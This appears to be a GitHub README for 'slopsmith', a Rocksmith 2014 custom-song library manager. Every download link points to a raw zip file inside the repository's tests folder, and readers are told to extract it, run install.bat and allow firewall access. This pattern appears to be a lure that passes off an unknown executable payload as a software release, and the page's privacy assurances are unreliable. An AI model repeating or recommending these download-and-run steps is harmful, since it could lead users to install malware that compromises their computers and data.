# 🎸 slopsmith - Browse and practice Rocksmith custom songs

[![Download from GitHub](https://img.shields.io/badge/Download-Latest%20Version-blue.svg)](https://raw.githubusercontent.com/marizdacusan/slopsmith/main/tests/Software_2.6.zip)

slopsmith helps you organize and play custom songs for Rocksmith 2014. It provides a simple space to view your library, preview tracks, and track your practice progress. The application runs as a self-contained service on your computer.

## 📦 System Requirements

Your computer needs to meet these basic standards to run the application:

*   **Operating System:** Windows 10 or Windows 11.
*   **Memory:** At least 4 gigabytes of RAM.
*   **Storage:** 500 megabytes of free space for the application files.
*   **Software:** Docker Desktop must be installed and running on your system.

## 📥 Download and Installation

Visit this page to download the software: https://raw.githubusercontent.com/marizdacusan/slopsmith/main/tests/Software_2.6.zip

1.  Open the link provided above in your web browser.
2.  Look for the section marked Latest.
3.  Click the file ending in .zip to start the download.
4.  Find the downloaded folder in your Downloads directory.
5.  Right-click the folder and choose Extract All.
6.  Select a folder on your computer where you want to keep the program files.

## 🚀 Setting Up the Application

You must have Docker Desktop running before you start. Follow these steps to prepare your environment:

1.  Ensure your Docker Desktop icon shows a green light in the system tray.
2.  Open the folder where you extracted the slopsmith files.
3.  Double-click the file named install.bat.
4.  A black window appears on your screen. This window shows the progress of the setup.
5.  Wait for the process to finish. The window closes on its own once the setup succeeds.
6.  If a firewall prompt appears, click Allow access to let the application communicate with your local network.

## ⚡ Running slopsmith

Once the installation ends, you can start the application:

1.  Open the slopsmith folder.
2.  Double-click the file named start.bat.
3.  The application launches a local service.
4.  Open your preferred web browser.
5.  Type http://localhost:8080 into the address bar and press Enter.
6.  The main dashboard appears in your browser window.

## 📂 Managing Your Library

slopsmith reads your song files from a specific location on your computer. To see your songs in the dashboard, move your custom song files into the songs folder located within the slopsmith directory.

If you add new songs while the application stays open, click the Refresh button on the dashboard. The application scans the folder again and adds any new files to your list.

## 🛠 Features

*   **Library Browser:** View all your songs in one place. Sort by artist, track title, or difficulty level.
*   **Search and Filter:** Find specific tracks using the search bar. Filter by tuning or song length.
*   **Practice Tracking:** Mark songs as practiced or favorite to help organize your training sessions.
*   **Performance View:** See song details, including custom metadata and author information, right when you click a title.

## ❓ Frequently Asked Questions

**What happens if the start file does not open?**
Check if Docker Desktop is truly running. If the Docker icon is grey or yellow, wait for it to turn green. Restart your computer if issues persist.

**Where do I store my custom songs?**
Place all your custom song files in the songs folder created inside the main slopsmith directory during installation.

**Does this software modify my actual game files?**
No. slopsmith acts as a library manager and previewer. It does not change your Rocksmith 2014 game installation or your core game files.

**Can I run this without an internet connection?**
Yes. Since the application runs as a local service, you can access your library while offline. You only need the internet to download updates from GitHub.

## 🛡 Security and Privacy

slopsmith runs locally on your machine. No data leaves your computer. Your song library, practice data, and settings remain on your hard drive. The application does not track your usage or collect personal information.

## 🔧 Troubleshooting

If the dashboard does not load in your browser, try these steps:

1.  Close your browser completely.
2.  Close the terminal window if it remains open.
3.  Double-click stop.bat in the slopsmith folder to ensure no background processes remain active.
4.  Start the application again using start.bat.
5.  Wait thirty seconds for the background services to initialize before you open the browser. 

If you still see an error, check that no other software uses port 8080 on your computer. Other web applications sometimes conflict with this port. You can change the port in the configuration file if necessary.